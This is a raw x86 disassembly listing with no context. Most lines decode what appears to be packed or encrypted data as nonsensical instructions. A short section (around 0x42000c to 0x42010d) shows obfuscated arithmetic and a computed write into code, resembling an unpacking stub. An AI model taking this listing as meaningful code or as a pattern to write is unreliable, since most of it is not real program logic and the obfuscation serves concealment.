  41fd35:	and    eax,0xcacde854
  41fd3a:	call   0xb34b:0x1626abc4
  41fd41:	ins    DWORD PTR es:[edi],dx
  41fd42:	in     al,0x98
  41fd44:	and    eax,0x8d25abf1
  41fd49:	out    dx,eax
  41fd4a:	nop
  41fd4b:	mov    al,0xfd
  41fd4d:	pop    esp
  41fd4e:	in     eax,0x24
  41fd50:	pop    ecx
  41fd51:	scas   al,BYTE PTR es:[edi]
  41fd52:	cld    
  41fd53:	gs xor eax,0xb7c00732
  41fd59:	pop    esp
  41fd5a:	in     al,dx
  41fd5b:	ss popf 
  41fd5d:	jp     0x41fd7a
  41fd5f:	push   ss
  41fd60:	cwde   
  41fd61:	pop    ebx
  41fd62:	into   
  41fd63:	cmc    
  41fd64:	xchg   esp,eax
  41fd65:	out    dx,eax
  41fd66:	(bad)  
  41fd68:	pop    esp
  41fd69:	sub    DWORD PTR [esi-0xee1b57d],ecx
  41fd6f:	(bad)  
  41fd70:	lock arpl WORD PTR [eax],bp
  41fd73:	push   edi
  41fd74:	jp     0x41fdaf
  41fd76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd77:	ja     0x41fdf2
  41fd79:	cmp    DWORD PTR [esi-0x78624868],esp
  41fd7f:	inc    ebx
  41fd80:	sti    
  41fd81:	cwde   
  41fd82:	(bad)  
  41fd83:	mov    edx,0x9925cc4f
  41fd88:	sbb    eax,0xef07c338
  41fd8d:	add    DWORD PTR [ebx+0xfb0f016],ecx
  41fd93:	outs   dx,DWORD PTR ds:[esi]
  41fd94:	xor    dl,BYTE PTR [ebx]
  41fd96:	xchg   esp,ebx
  41fd98:	aad    0x91
  41fd9a:	mov    ds:0x2a24bb99,al
  41fd9f:	sar    ch,1
  41fda1:	iret   
  41fda2:	push   ebp
  41fda3:	neg    BYTE PTR [esi-0x77ee9357]
  41fda9:	mov    edx,0x7b2779d8
  41fdae:	loope  0x41fd86
  41fdb0:	rcl    BYTE PTR [esi],1
  41fdb2:	lods   al,BYTE PTR ds:[esi]
  41fdb3:	test   al,0x95
  41fdb5:	lock sub DWORD PTR [ebx-0x676cf772],eax
  41fdbc:	push   esi
  41fdbd:	pop    ebx
  41fdbe:	jmp    0x6e7b:0x7284a1f7
  41fdc5:	mov    dl,0xe7
  41fdc7:	lds    edi,FWORD PTR [esi+eiz*1-0x4f]
  41fdcb:	popf   
  41fdcc:	ja     0x41fde8
  41fdce:	(bad)  
  41fdcf:	js     0x41fd76
  41fdd1:	in     al,dx
  41fdd2:	aaa    
  41fdd3:	or     BYTE PTR [ebx+0x34a27605],0x3e
  41fdda:	sub    DWORD PTR [ebx+ebx*4],0xfffffff3
  41fdde:	out    dx,al
  41fddf:	fnstsw WORD PTR [eax+0x26]
  41fde2:	xor    al,0x4d
  41fde4:	shl    DWORD PTR [edi-0x48],cl
  41fde7:	es fs iret 
  41fdea:	pop    ss
  41fdeb:	xor    DWORD PTR [ebp-0x2a],ecx
  41fdee:	cdq    
  41fdef:	ja     0x41fd92
  41fdf1:	call   0xe62:0x5cba4634
  41fdf8:	mov    al,0x5e
  41fdfa:	jg     0x41fe25
  41fdfc:	dec    ecx
  41fdfd:	inc    ebp
  41fdfe:	sub    esi,DWORD PTR [ebp+0x53e6957]
  41fe04:	mov    DWORD PTR [edi+esi*2+0x21],edx
  41fe08:	or     BYTE PTR [eax-0x8],al
  41fe0b:	push   0x28edbd3
  41fe10:	mov    eax,0x5f167d5
  41fe15:	or     ecx,edi
  41fe17:	adc    ebx,DWORD PTR [edi-0x1cd45abf]
  41fe1d:	push   edi
  41fe1e:	and    bh,BYTE PTR [edi+0x31]
  41fe21:	inc    esp
  41fe22:	dec    esi
  41fe23:	retf   0x6d0f
  41fe26:	dec    ecx
  41fe27:	retf   
  41fe28:	nop
  41fe29:	jnp    0x41fe10
  41fe2b:	push   esi
  41fe2c:	mov    al,0x62
  41fe2e:	aam    0xf6
  41fe30:	in     eax,dx
  41fe31:	iret   
  41fe32:	sbb    eax,0x7fe648e8
  41fe37:	lds    ebp,FWORD PTR [edi-0x5b]
  41fe3a:	and    DWORD PTR [esi],esp
  41fe3c:	mov    edi,0xfa346a80
  41fe41:	in     al,0xbe
  41fe43:	sub    dl,dh
  41fe45:	sbb    cl,0x52
  41fe48:	jg     0x41fdff
  41fe4a:	push   ebx
  41fe4b:	inc    edi
  41fe4c:	icebp  
  41fe4d:	and    BYTE PTR [eax+0x7f68af2e],0x2f
  41fe54:	xchg   ebp,eax
  41fe55:	push   ebp
  41fe56:	loopne 0x41fe3d
  41fe58:	and    ebx,ebp
  41fe5a:	dec    eax
  41fe5b:	jns    0x41fe88
  41fe5d:	sub    dh,0xd8
  41fe60:	mov    eax,ds:0xa7d292df
  41fe65:	push   DWORD PTR ds:0x88960f82
  41fe6b:	jnp    0x41fdf1
  41fe6d:	stos   BYTE PTR es:[edi],al
  41fe6e:	xchg   ebp,eax
  41fe6f:	cwde   
  41fe70:	adc    DWORD PTR [ecx+0x3f817184],ebx
  41fe76:	mov    dh,0xf4
  41fe78:	ret    
  41fe79:	out    0x6c,eax
  41fe7b:	js     0x41fe95
  41fe7d:	sti    
  41fe7e:	push   edi
  41fe7f:	jecxz  0x41fe89
  41fe81:	pop    edx
  41fe82:	and    bl,cl
  41fe84:	(bad)  [ebp-0x7c]
  41fe87:	mov    eax,ds:0xc66398b7
  41fe8c:	stos   DWORD PTR es:[edi],eax
  41fe8d:	inc    edx
  41fe8e:	pop    ss
  41fe8f:	pusha  
  41fe90:	push   ebp
  41fe91:	inc    eax
  41fe92:	mov    dl,0xa5
  41fe94:	cmp    DWORD PTR [esi+eax*1-0x1],ecx
  41fe98:	cmp    DWORD PTR [ecx+0x16],esi
  41fe9b:	icebp  
  41fe9c:	dec    ebx
  41fe9d:	in     al,0x56
  41fe9f:	and    eax,0x66daaca2
  41fea4:	xor    eax,0xdd06630c
  41fea9:	mov    al,BYTE PTR [esi+0x6d]
  41feac:	pushf  
  41fead:	shl    BYTE PTR [eax*1-0x6a5402d0],1
  41feb4:	pop    ebx
  41feb5:	mov    ds:0x79bb5ed2,al
  41feba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41febb:	dec    edx
  41febc:	mov    edi,DWORD PTR [edx]
  41febe:	dec    esp
  41febf:	out    0xae,eax
  41fec1:	dec    edi
  41fec2:	into   
  41fec3:	sub    al,BYTE PTR [ebp-0x437a9863]
  41fec9:	jmp    0x41fe6b
  41fecb:	cmc    
  41fecc:	jmp    0x15fcf94f
  41fed1:	inc    edx
  41fed2:	sahf   
  41fed3:	mov    edi,0x3f9dffc6
  41fed8:	repz push eax
  41feda:	pop    esp
  41fedb:	test   eax,0x763a1585
  41fee0:	dec    eax
  41fee1:	fstp   TBYTE PTR [edi+esi*8+0x79]
  41fee5:	pop    ecx
  41fee6:	cmp    eax,0x47
  41fee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feea:	(bad)
  41feed:	rol    BYTE PTR [edx-0x313d63f1],1
  41fef3:	xchg   dl,ah
  41fef5:	xor    DWORD PTR [ebx+0x63615e7c],ebx
  41fefb:	fcmovb st,st(5)
  41fefd:	and    dh,BYTE PTR [ecx]
  41feff:	sbb    al,0xea
  41ff01:	jb     0x41ff66
  41ff03:	xchg   ecx,eax
  41ff04:	outs   dx,BYTE PTR ds:[esi]
  41ff05:	or     al,0x52
  41ff07:	xor    ebp,DWORD PTR [ecx+0x6692c1ce]
  41ff0d:	xor    edx,ecx
  41ff0f:	adc    DWORD PTR [edx],esp
  41ff11:	mov    DWORD PTR [edx],edx
  41ff13:	sbb    ah,dl
  41ff15:	daa    
  41ff16:	jnp    0x41ff2b
  41ff18:	sbb    ebp,DWORD PTR [edx]
  41ff1a:	jge    0x41ff2f
  41ff1c:	push   ss
  41ff1d:	enter  0xd642,0x5b
  41ff21:	pop    ds
  41ff22:	icebp  
  41ff23:	lods   eax,DWORD PTR ds:[esi]
  41ff24:	mov    cl,0x3f
  41ff26:	das    
  41ff27:	push   DWORD PTR [edi+0x8ba3cf6]
  41ff2d:	data16 or BYTE PTR [edi+edi*8+0xd],dl
  41ff32:	push   esi
  41ff33:	xor    eax,esi
  41ff35:	std    
  41ff36:	xlat   BYTE PTR ds:[ebx]
  41ff37:	jge    0x41ff4e
  41ff39:	xor    al,0x43
  41ff3b:	test   DWORD PTR ds:0xf1bb7c0f,esp
  41ff41:	imul   esp,DWORD PTR [ebp+0x69],0xef717fa9
  41ff48:	ins    BYTE PTR es:[edi],dx
  41ff49:	aad    0x98
  41ff4b:	iret   
  41ff4c:	sub    al,BYTE PTR gs:[edi]
  41ff4f:	mov    eax,ds:0xaf865d0
  41ff54:	xchg   ebx,eax
  41ff55:	sub    BYTE PTR [edx-0x7],dl
  41ff58:	jnp    0x41ff60
  41ff5a:	rcl    BYTE PTR [edx+0x138f290c],1
  41ff60:	fld    TBYTE PTR [esi+0x6e]
  41ff63:	(bad)  
  41ff64:	test   eax,0x71843c78
  41ff69:	and    al,0x2b
  41ff6b:	jo     0x41ffde
  41ff6d:	sub    dh,ch
  41ff6f:	xor    al,0x3e
  41ff71:	hlt    
  41ff72:	in     al,0x29
  41ff74:	sub    al,0xe2
  41ff76:	jle    0x41ffed
  41ff78:	dec    esp
  41ff79:	sbb    ecx,eax
  41ff7b:	call   0x5187:0x2c96d039
  41ff82:	or     DWORD PTR [eax-0x55f2c4ce],edx
  41ff88:	call   0xe3df:0xda456645
  41ff8f:	sti    
  41ff90:	jmp    0x41ffd3
  41ff92:	xor    DWORD PTR [eax],0x16
  41ff95:	gs cdq 
  41ff97:	(bad)  
  41ff98:	fcmovnu st,st(0)
  41ff9a:	fs fwait
  41ff9c:	cmp    al,0x62
  41ff9e:	scas   al,BYTE PTR es:[edi]
  41ff9f:	jne    0x41ff76
  41ffa1:	inc    esp
  41ffa2:	loop   0x41ff5e
  41ffa4:	mov    dl,0x7a
  41ffa6:	or     eax,0xa771a3e4
  41ffab:	jnp    0x41ff77
  41ffad:	or     al,0x8d
  41ffaf:	jp     0x41ff84
  41ffb1:	in     al,dx
  41ffb2:	jmp    0x16fa:0x85cf2560
  41ffb9:	sub    DWORD PTR [di],ebp
  41ffbc:	push   ebx
  41ffbd:	push   0x73970d31
  41ffc2:	in     eax,dx
  41ffc3:	xchg   edi,eax
  41ffc4:	ror    DWORD PTR [ecx-0x42333f52],1
  41ffca:	ins    BYTE PTR es:[edi],dx
  41ffcb:	ins    DWORD PTR es:[edi],dx
  41ffcc:	xor    al,0xf1
  41ffce:	ja     0x42001d
  41ffd0:	mov    ds,WORD PTR [edi+0x7d60a44a]
  41ffd6:	ret    0x8ec5
  41ffd9:	leave  
  41ffda:	ja     0x42000a
  41ffdc:	xchg   esi,eax
  41ffdd:	in     eax,0x21
  41ffdf:	fist   WORD PTR ds:0xeb4c4fae
  41ffe5:	stos   WORD PTR es:[edi],ax
  41ffe7:	pop    ecx
  41ffe8:	dec    esi
  41ffe9:	into   
  41ffea:	push   esp
  41ffeb:	repz inc edx
  41ffed:	or     eax,esp
  41ffef:	dec    edx
  41fff0:	scas   eax,DWORD PTR es:[edi]
  41fff1:	cmp    eax,0x33e8d79
  41fff6:	mov    bl,0x74
  41fff8:	cmp    ecx,DWORD PTR [edi-0x75]
  41fffb:	dec    ebp
  41fffc:	call   0x45cbc12c
  420001:	call   0xa62a4d87
  420006:	add    eax,0x458bf89f
  42000b:	hlt    
  42000c:	mov    ecx,DWORD PTR [ebp-0xc]
  42000f:	sub    eax,ecx
  420011:	mov    DWORD PTR [ebp-0xc],eax
  420014:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42001b:	mov    eax,DWORD PTR [ebp-0x1c]
  42001e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420021:	sub    eax,ecx
  420023:	mov    DWORD PTR [ebp-0x1c],eax
  420026:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42002d:	mov    eax,DWORD PTR [ebp-0x20]
  420030:	mov    ecx,DWORD PTR [ebp-0x20]
  420033:	sub    eax,ecx
  420035:	mov    DWORD PTR [ebp-0x20],eax
  420038:	mov    eax,DWORD PTR [ebp-0x2c]
  42003b:	mov    ecx,DWORD PTR [ebp-0x20]
  42003e:	mov    esi,0x75108ae
  420043:	xor    eax,esi
  420045:	mov    edi,0x3272f5
  42004a:	add    eax,edi
  42004c:	or     eax,ecx
  42004e:	mov    DWORD PTR [ebp-0x20],eax
  420051:	mov    eax,DWORD PTR [ebp-0x4]
  420054:	mov    ecx,DWORD PTR [ebp-0x4]
  420057:	sub    eax,ecx
  420059:	mov    DWORD PTR [ebp-0x4],eax
  42005c:	or     DWORD PTR [ebp-0x4],0xf89c85be
  420063:	mov    eax,DWORD PTR [ebp-0xc]
  420066:	xor    eax,esi
  420068:	add    eax,edi
  42006a:	push   eax
  42006b:	mov    eax,DWORD PTR [ebp-0x10]
  42006e:	xor    eax,esi
  420070:	add    eax,edi
  420072:	push   eax
  420073:	mov    eax,DWORD PTR [ebp-0x4]
  420076:	xor    eax,esi
  420078:	add    eax,edi
  42007a:	push   eax
  42007b:	lea    eax,[ebp-0x78]
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp-0x2c]
  420082:	push   DWORD PTR [ebp-0x28]
  420085:	call   0x40f76f
  42008a:	test   eax,eax
  42008c:	je     0x4200ba
  420092:	lea    eax,[ebp-0x78]
  420095:	push   eax
  420096:	mov    eax,DWORD PTR [ebp-0x28]
  420099:	xor    eax,esi
  42009b:	add    eax,edi
  42009d:	push   eax
  42009e:	mov    eax,DWORD PTR [ebp-0x24]
  4200a1:	add    eax,0xaa
  4200a6:	push   eax
  4200a7:	mov    eax,DWORD PTR [ebp-0x24]
  4200aa:	mov    eax,DWORD PTR [eax+0x198]
  4200b0:	push   DWORD PTR [eax]
  4200b2:	call   0x4061fa
  4200b7:	mov    DWORD PTR [ebp-0x14],eax
  4200ba:	mov    ecx,DWORD PTR ds:0x42a56a
  4200c0:	lea    eax,[ebp+0x4]
  4200c3:	mov    DWORD PTR [ecx*4+0x42a562],eax
  4200ca:	inc    DWORD PTR ds:0x42a56a
  4200d0:	mov    eax,DWORD PTR [ebp-0x14]
  4200d3:	test   eax,eax
  4200d5:	je     0x4224ce
  4200db:	lea    eax,[ebp-0x8]
  4200de:	mov    DWORD PTR [ebp-0x34],eax
  4200e1:	mov    eax,DWORD PTR [ebp-0x30]
  4200e4:	mov    DWORD PTR [ebp-0x8],eax
  4200e7:	mov    eax,DWORD PTR [ebp-0x8]
  4200ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4200ed:	sub    eax,ecx
  4200ef:	mov    DWORD PTR [ebp-0x8],eax
  4200f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4200f5:	xor    ecx,esi
  4200f7:	mov    eax,0xffcd8d0b
  4200fc:	sub    eax,ecx
  4200fe:	add    DWORD PTR [ebp-0x8],eax
  420101:	mov    eax,DWORD PTR [ebp-0x8]
  420104:	mov    ecx,DWORD PTR [ebp-0x14]
  420107:	mov    DWORD PTR [ecx+0x1],eax
  42010a:	mov    eax,DWORD PTR [ebp-0x14]
  42010d:	jmp    0x42249e
  420112:	adc    ebp,DWORD PTR [ebx]
  420114:	inc    BYTE PTR [eax-0x2a]
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	xchg   ecx,eax
  420119:	or     dh,bh
  42011b:	lahf   
  42011c:	cmp    eax,0x1f0d3c0a
  420121:	outs   dx,BYTE PTR ds:[esi]
  420122:	push   es
  420123:	mov    dh,0x80
  420125:	or     DWORD PTR [edi],0x5e
  420128:	add    DWORD PTR [ebx+0x3b33ccc9],0xffffffe0
  42012f:	adc    BYTE PTR [ebp+0x74],ch
  420132:	sub    al,0xd
  420135:	sbb    dh,ch
  420137:	sar    DWORD PTR [eax-0x34979a4f],cl
  42013d:	pop    ebx
  42013e:	sbb    al,0x4c
  420140:	(bad)  
  420141:	jb     0x420146
  420143:	pop    ebp
  420144:	lahf   
  420145:	out    dx,eax
  420146:	sti    
  420147:	cli    
  420148:	cmp    ecx,DWORD PTR [ecx+0x6]
  42014b:	mov    ebx,0x4e5b206d
  420150:	xor    ebp,ecx
  420152:	xor    eax,0xa965221c
  420157:	sti    
  420158:	leave  
  420159:	cmp    eax,0x629bbaf4
  42015e:	xchg   DWORD PTR [ebp+0x539e8d2f],ebx
  420164:	les    eax,FWORD PTR [ecx-0x628457c5]
  42016a:	add    ch,BYTE PTR [esi+eax*2+0x4]
  42016e:	cld    
  42016f:	ficomp WORD PTR [eax]
  420171:	out    dx,eax
  420172:	dec    eax
  420173:	rcr    bl,1
  420175:	sub    BYTE PTR [edx+0x34],al
  420178:	(bad)  
  420179:	in     eax,dx
  42017a:	mov    eax,ds:0x9afb3cac
  42017f:	stos   BYTE PTR es:[edi],al
  420180:	loop   0x42018e
  420182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420183:	call   0x8153:0x1bea256e
  42018a:	bound  esp,QWORD PTR [esi+eiz*8+0x30]
  42018e:	mov    bh,0xda
  420190:	ins    DWORD PTR es:[edi],dx
  420191:	mov    eax,ds:0x58b6b147
  420196:	jmp    0x2ee2:0xbd853b65
  42019d:	dec    ebx
  42019e:	mov    bl,0x43
  4201a0:	xchg   esp,eax
  4201a1:	or     ah,BYTE PTR [ecx]
  4201a3:	(bad)  
  4201a4:	cmp    bh,bl
  4201a6:	test   DWORD PTR [esi-0x16314d12],ecx
  4201ac:	out    0x39,al
  4201ae:	test   DWORD PTR [ebx],0x43ad7e10
  4201b4:	cmp    BYTE PTR [esi],bl
  4201b6:	imul   esp,DWORD PTR [eax],0x32719461
  4201bc:	cmp    dl,dl
  4201be:	jmp    0xb9ba9646
  4201c3:	stos   BYTE PTR es:[edi],al
  4201c4:	mov    bl,BYTE PTR [ebp-0x52081341]
  4201ca:	je     0x420246
  4201cc:	cmp    dh,dl
  4201ce:	xor    al,0x22
  4201d0:	jge    0x42021a
  4201d2:	inc    eax
  4201d3:	xchg   esi,eax
  4201d4:	push   0x485f2f43
  4201d9:	or     ebx,DWORD PTR [ebp-0x65b1d66b]
  4201df:	push   ebp
  4201e0:	inc    esi
  4201e1:	push   eax
  4201e2:	xor    DWORD PTR [edx-0xd285ebd],ebp
  4201e8:	(bad)  
  4201e9:	jmp    0x42018e
  4201eb:	push   esp
  4201ec:	leave  
  4201ed:	adc    BYTE PTR [esi-0x316b7fb2],bh
  4201f3:	jnp    0x42019b
  4201f5:	lea    ebp,[ebp-0x47eda7a9]
  4201fb:	ds sub ecx,ebp
  4201fe:	sub    edx,DWORD PTR [esi]
  420200:	mov    bl,0xb4
  420202:	stos   BYTE PTR es:[edi],al
  420203:	jno    0x4201ef
  420205:	adc    BYTE PTR [edx],dh
  420207:	jmp    FWORD PTR [ebx-0x1c]
  42020a:	out    dx,eax
  42020b:	pop    esi
  42020c:	adc    dh,bh
  42020e:	mov    al,ds:0xc8457194
  420213:	sbb    DWORD PTR [eax],edx
  420215:	dec    esi
  420216:	xor    BYTE PTR [ecx],ch
  420218:	jmp    0xe3a1d864
  42021d:	push   es
  42021e:	ffree  st(0)
  420220:	jmp    0x3c7774be
  420225:	mov    bl,0x1a
  420227:	fwait
  420228:	scas   al,BYTE PTR es:[edi]
  420229:	repnz adc al,0xcd
  42022c:	stc    
  42022d:	inc    esi
  42022e:	push   edx
  42022f:	jb     0x420268
  420231:	xlat   BYTE PTR ds:[ebx]
  420232:	jp     0x4201d9
  420234:	fadd   QWORD PTR [edx+ebx*8-0x2]
  420238:	lods   al,BYTE PTR ds:[esi]
  420239:	fld    st(4)
  42023b:	ins    DWORD PTR es:[edi],dx
  42023c:	dec    esi
  42023d:	dec    edi
  42023e:	idiv   DWORD PTR [ebx]
  420240:	push   0xfffffff0
  420242:	cmp    bl,BYTE PTR [ebx-0x38fd8d81]
  420248:	jae    0x420266
  42024a:	int    0x4
  42024c:	(bad)  
  42024d:	jmp    0x4201e5
  42024f:	outs   dx,DWORD PTR ds:[esi]
  420250:	and    bh,BYTE PTR [ebx+0xe03a0cc]
  420256:	stos   DWORD PTR es:[edi],eax
  420257:	xor    ebx,esi
  420259:	shr    edx,1
  42025b:	pop    esp
  42025c:	ja     0x4202c2
  42025e:	fcom   QWORD PTR [ecx+0x74]
  420261:	je     0x42027e
  420263:	pop    es
  420264:	sub    eax,0xdb293920
  420269:	xor    eax,0xd1a7fee0
  42026e:	xor    al,0x1d
  420270:	xchg   ecx,eax
  420271:	addr16 ret 0x5be1
  420275:	enter  0xd892,0x35
  420279:	pop    ebp
  42027a:	inc    esp
  42027b:	dec    eax
  42027c:	mov    esp,0x27595c40
  420281:	xchg   esp,ecx
  420283:	loope  0x42021c
  420285:	pop    edi
  420286:	jg     0x420262
  420288:	xchg   ebp,eax
  420289:	test   BYTE PTR [ebx-0x33],dh
  42028c:	cdq    
  42028d:	adc    esi,DWORD PTR [ebp+eiz*4-0x3b]
  420291:	test   eax,0x1744291e
  420296:	arpl   WORD PTR [esp+ebx*4-0x15d2974d],bp
  42029d:	pop    ebp
  42029e:	imul   edx,DWORD PTR [edx-0x5af01f4f],0xd48187e
  4202a8:	add    eax,0x86a71d30
  4202ad:	and    BYTE PTR [edx-0xd0fea48],bh
  4202b3:	aas    
  4202b4:	and    BYTE PTR [esi-0x2c],bh
  4202b7:	imul   ecx,edx,0x22f70472
  4202bd:	stc    
  4202be:	push   ecx
  4202bf:	add    al,BYTE PTR [edi+0x591be26b]
  4202c5:	sub    DWORD PTR [edi],0x15647f42
  4202cb:	in     al,0x68
  4202cd:	and    eax,0x25830004
  4202d2:	push   cs
  4202d3:	hlt    
  4202d4:	push   esi
  4202d5:	mov    ebp,0xf9a14a94
  4202da:	mov    WORD PTR [eax+0x4d],cs
  4202dd:	cmp    al,0x8a
  4202df:	int3   
  4202e0:	inc    esp
  4202e1:	inc    ecx
  4202e2:	inc    ebx
  4202e3:	test   DWORD PTR [ecx+edx*4-0x72],esp
  4202e7:	jecxz  0x4202a1
  4202e9:	mov    ah,BYTE PTR [eax-0x2b196846]
  4202ef:	shl    DWORD PTR [esi-0x36],cl
  4202f2:	xchg   edx,eax
  4202f3:	ficomp DWORD PTR [ecx-0x12]
  4202f6:	call   0x674a:0x4a67823d
  4202fd:	jnp    0x4202b6
  4202ff:	out    dx,eax
  420300:	xor    BYTE PTR [ecx+0x50f1e46d],dl
  420306:	jno    0x42028c
  420308:	mov    ebx,0x4d761325
  42030d:	sub    eax,0xb62dcb16
  420312:	sub    DWORD PTR [ebx+0x70963428],0xac67d68e
  42031c:	pop    ds
  42031d:	test   DWORD PTR [esi+0x46],esi
  420320:	pop    esp
  420321:	and    eax,DWORD PTR ds:0xf6d1bcfd
  420327:	(bad)  
  420328:	pusha  
  420329:	scas   eax,DWORD PTR es:[edi]
  42032a:	test   al,0x60
  42032c:	idiv   bh
  42032e:	aad    0xf3
  420330:	dec    eax
  420331:	lods   eax,DWORD PTR ds:[esi]
  420332:	cmp    bh,dh
  420334:	jns    0x4203a9
  420336:	gs push edi
  420338:	rcl    BYTE PTR [eax+0x2],1
  42033b:	lahf   
  42033c:	sbb    cl,BYTE PTR [eax+0x6]
  42033f:	dec    eax
  420340:	retf   
  420341:	mov    ds:0xeb0760dd,eax
  420346:	(bad)  
  420348:	cmp    eax,0x78aed08c
  42034d:	xlat   BYTE PTR ds:[ebx]
  42034e:	cmp    DWORD PTR [ebx+0x8],edx
  420351:	pop    eax
  420352:	jne    0x4202f4
  420354:	shl    DWORD PTR [esi-0x6d492db5],cl
  42035a:	fstp   DWORD PTR [ecx]
  42035c:	xor    cl,BYTE PTR [edx-0x6e]
  42035f:	jbe    0x420325
  420361:	aam    0x74
  420363:	or     dl,bl
  420365:	dec    eax
  420366:	test   eax,0xb2b5d075
  42036c:	pop    es
  42036d:	and    DWORD PTR [ebx],ecx
  42036f:	je     0x4202f4
  420371:	xlat   BYTE PTR ds:[ebx]
  420372:	or     BYTE PTR [esi-0x5a],ah
  420375:	mov    ecx,0xe548628f
  42037a:	ss pop ds
  42037c:	jmp    0x74f0:0xb0f4ad42
  420383:	xor    eax,0x5ad8f44
  420388:	int    0xca
  42038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42038b:	ins    BYTE PTR es:[edi],dx
  42038c:	ja     0x42034c
  42038e:	push   es
  42038f:	inc    esi
  420390:	(bad)
  420393:	and    BYTE PTR [edi],al
  420395:	mov    esp,0x166add5
  42039a:	dec    esi
  42039b:	shl    esi,cl
  42039d:	sub    DWORD PTR [edi+0x73],0x20fea197
  4203a4:	xchg   ebp,eax
  4203a5:	and    esp,ebp
  4203a7:	(bad)  
  4203a8:	test   BYTE PTR [edx-0x48],0xed
  4203ac:	sbb    edi,DWORD PTR [ebx+0x38]
  4203af:	pop    edx
  4203b0:	ss jbe 0x42034f
  4203b3:	mov    bh,0x12
  4203b5:	in     eax,0x55
  4203b7:	xor    ebx,ecx
  4203b9:	cmp    esi,DWORD PTR [edx-0x64]
  4203bc:	xchg   ebp,eax
  4203bd:	push   cs
  4203be:	(bad)  
  4203bf:	cmp    bh,BYTE PTR [eax+eax*2+0x5f6f7f42]
  4203c6:	in     eax,dx
  4203c7:	in     al,dx
  4203c8:	aas    
  4203c9:	mov    ebp,esp
  4203cb:	jmp    0x42044c
  4203cd:	pop    esp
  4203ce:	dec    eax
  4203cf:	xor    DWORD PTR [ebx+0x27],0x5c
  4203d3:	xor    DWORD PTR [ebx+0x5a6d6a71],eax
  4203d9:	xchg   edx,eax
  4203da:	add    eax,0x2ed5ee3b
  4203df:	stos   BYTE PTR es:[edi],al
  4203e0:	pop    edx
  4203e1:	sub    al,0x78
  4203e3:	sbb    ax,0x3150
  4203e7:	dec    edi
  4203e8:	nop
  4203e9:	and    ch,BYTE PTR [esi]
  4203eb:	push   esp
  4203ec:	call   0xc543:0x43f73e2c
  4203f3:	dec    edx
  4203f4:	mov    dl,0xd7
  4203f6:	mov    eax,ds:0x47e7a394
  4203fb:	dec    ecx
  4203fc:	and    DWORD PTR [ebx],edx
  4203fe:	loopne 0x420405
  420400:	call   0x115c907e
  420405:	in     eax,dx
  420406:	repnz mov ch,0xf6
  420409:	hlt    
  42040a:	(bad)  
  42040b:	mov    bh,0x9c
  42040d:	and    BYTE PTR [ecx+0x5],0xc0
  420411:	mov    bl,0xb3
  420413:	test   BYTE PTR [edx-0x333b9f27],bl
  420419:	cmp    edi,esi
  42041b:	scas   eax,DWORD PTR es:[edi]
  42041c:	add    ebp,eax
  42041e:	lock retf 0x9b48
  420422:	and    ecx,edx
  420424:	mov    edi,0xd8d26f1b
  420429:	push   ebx
  42042a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42042b:	mov    ds:0x887c6a68,eax
  420430:	mov    al,ds:0x50cbe847
  420435:	ins    BYTE PTR es:[edi],dx
  420436:	or     al,0xdc
  420438:	loop   0x4203d5
  42043a:	inc    edi
  42043b:	hlt    
  42043c:	dec    edx
  42043d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42043e:	mov    ch,0x53
  420440:	ds mov edi,0x77f52954
  420446:	jmp    0x4f11:0x28c9a28d
  42044d:	adc    al,0xba
  42044f:	dec    ebx
  420450:	sbb    eax,0x61bbcfc9
  420455:	add    ebx,eax
  420457:	push   ecx
  420458:	bound  esi,QWORD PTR [edx]
  42045a:	and    DWORD PTR [edx-0x1e009fe8],ecx
  420460:	push   ds
  420461:	cmp    al,0xa1
  420463:	sub    BYTE PTR [edx+ebx*8],ah
  420466:	cmp    ch,bh
  420468:	dec    esi
  420469:	repnz mov WORD PTR [ebp+edi*4+0x57303bc7],ds
  420471:	adc    DWORD PTR [edi-0x24cc20d0],ebp
  420477:	mov    DWORD PTR [eax+0x2d],edi
  42047a:	pextrw esi,mm0,0xd3
  42047e:	pop    edx
  42047f:	retf   
  420480:	and    BYTE PTR [ecx],dh
  420482:	aas    
  420483:	add    eax,0x2d46ebd4
  420488:	sub    dl,BYTE PTR [edx-0x43]
  42048b:	inc    ebp
  42048c:	mov    ebx,0x111300b4
  420491:	int    0xc0
  420493:	lea    edx,[edi+0x2b3e9dc1]
  420499:	(bad)  
  42049a:	and    DWORD PTR [ebp-0x49be3257],ebx
  4204a0:	inc    ebx
  4204a1:	mov    ebp,0x70799bcf
  4204a6:	add    eax,0x2a765072
  4204ab:	or     ah,BYTE PTR [ecx-0x2]
  4204ae:	add    al,0xc9
  4204b0:	or     esi,edi
  4204b2:	pop    esp
  4204b3:	ja     0x4204c6
  4204b5:	(bad)  
  4204b6:	fldenv ds:0x6751f0c5
  4204bc:	sbb    BYTE PTR ds:0x8f00f25a,al
  4204c2:	push   cs
  4204c3:	les    eax,FWORD PTR [edi]
  4204c5:	inc    edx
  4204c6:	pop    esi
  4204c7:	test   DWORD PTR [ebp-0x18],ecx
  4204ca:	mov    ds:0xf18df54d,eax
  4204cf:	xchg   ebp,eax
  4204d0:	aad    0x56
  4204d2:	ds (bad) 
  4204d4:	cmc    
  4204d5:	int    0xf3
  4204d7:	sar    ch,1
  4204d9:	aad    0x24
  4204db:	xchg   edi,eax
  4204dc:	push   edi
  4204dd:	popa   
  4204de:	sbb    DWORD PTR [eax],ecx
  4204e0:	daa    
  4204e1:	mov    ss:0x221e480e,al
  4204e7:	mov    bh,0x99
  4204e9:	inc    ebp
  4204ea:	aas    
  4204eb:	add    dh,BYTE PTR [esi-0x1d3c1296]
  4204f1:	adc    esi,DWORD PTR [esi+0x7]
  4204f4:	in     eax,0xd
  4204f6:	mov    ?,WORD PTR [edi+edi*2]
  4204f9:	repz mov ebp,0x2c3fe975
  4204ff:	imul   ebx,DWORD PTR [edi-0x3ed957f2],0xffffffcc
